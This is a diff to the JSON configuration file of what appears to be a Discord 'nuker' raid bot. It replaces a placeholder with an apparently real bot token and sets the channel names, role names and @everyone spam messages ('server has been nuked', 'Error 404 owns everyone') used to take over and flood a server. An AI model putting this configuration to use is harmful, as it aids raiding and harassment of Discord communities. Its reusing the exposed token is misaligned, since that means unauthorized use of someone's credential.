@@ -1,7 +1,7 @@
 {
-"bot_token": "Bot Token",
-"prefix": "$",
-"channelnames": "Axe Runs Cord",
-"rolenames": "AXES RUNS CORD",
-"spam_text": ["@everyone Axes Runs Cord", "@everyone Boom! Get Nuked", "@everyone Axes Are Cool", "@everyone Beamed"]
+"bot_token": "MTEwNjMzMTU0ODg5MjAwNDQxMg.GbVl38.HavMsJgW0Z4hdAKwCAmwJj5KzTz0hIx7nT2rsg",
+"prefix": ">Run",
+"channelnames": "Error 404",
+"rolenames": "Error 404",
+"spam_text": ["@everyone Error 404 server has been nuked", "@everyone Server is managed by error now", "@everyone Error 404 owns everyone", "@everyone Server is no longer managed being shut down"]
 }
